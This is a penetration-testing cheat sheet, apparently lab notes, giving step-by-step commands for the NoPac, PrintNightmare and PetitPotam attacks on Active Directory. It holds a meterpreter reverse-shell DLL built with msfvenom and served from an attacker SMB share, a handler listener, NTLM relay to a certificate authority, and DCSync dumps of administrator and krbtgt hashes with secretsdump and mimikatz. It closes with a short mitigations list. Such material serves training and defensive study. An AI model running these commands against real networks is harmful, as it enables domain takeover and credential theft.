## NoPac (SamAccountName Spoofing)

Privilege escalation technique to gain SYSTEM shell on Domain Controller

**Ensuring Impacket is Installed & noPac
```
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install
git clone https://github.com/Ridter/noPac.git
```

**Scanning for NoPac
```
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
- If ms-DS-MachineAccountQuota is set to 0, this attack will fail

**Running NoPac & Getting a Shell
```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
- This is an smbexec shell, meaning it must use exact paths instead of navigating the directory structure using cd
- We can confirm the location of saved tickets with 'ls'
- We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync.

**Using noPac to DCSync the Built-in Administrator Account
```
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

**Windows Defender & SMBEXEC.py Considerations
If Windows Defender is enabled on the target, our shell may be established, but issuing commands will fail.



## PrintNightmare
Allows for privilege escalation and remote code execution
```
git clone https://github.com/cube0x0/CVE-2021-1675.git
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

**Enumerating for MS-RPRN
```
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

**Generating a DLL Payload
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

**Creating a Share with smbserver.py
```
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

**Configuring & Starting MSF multi/handler
```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run
```

**Running the Exploit
```
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

**Getting the SYSTEM Shell
```
shell
whoami
```


## PetitPotam (MS-EFSRPC)

**Starting ntlmrelayx.py
```
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
- If we do not know the location of the CA, we can use the tool: https://github.com/zer1t0/certi

In another window:
```
python3 PetitPotam.py 172.16.5.225 172.16.5.5 
```

**Requesting a TGT Using gettgtpkinit.py
```
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```
- Use the base64 encoded certificate that was captured with ntlmrelayx.py

**Setting the KRB5CCNAME Environment Variable
```
export KRB5CCNAME=dc01.ccache
```
- Attack host uses this file for Kerberos authentication attempts

**Using Domain Controller TGT to DCSync
```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

**Confirming Admin Access to the Domain Controller
```
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

Alternate route after receiving TGT for our target:
**Submitting a TGS Request for Ourselves Using getnthash.py
```
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```
- key is the AS-REP encryption key we obtained when requesting the TGT earlier

**Using Domain Controller NTLM Hash to DCSync
```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```


Alternate approach once we obtain the base64 certificate via ntlmrelayx.py (WINDOWS)
**Requesting TGT and Performing PTT with DC01$ Machine Account
```
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```

**Performing DCSync with Mimikatz
```
cd .\mimikatz\x64\
.\mimikatz.exe
lsadump::dcsync /user:inlanefreight\krbtgt
```

**Mitigations
- To prevent NTLM relay attacks, use Extended Protection for Authentication along with enabling Require SSL to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- Disabling NTLM authentication for Domain Controllers
- Disabling NTLM on AD CS servers using Group Policy
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use

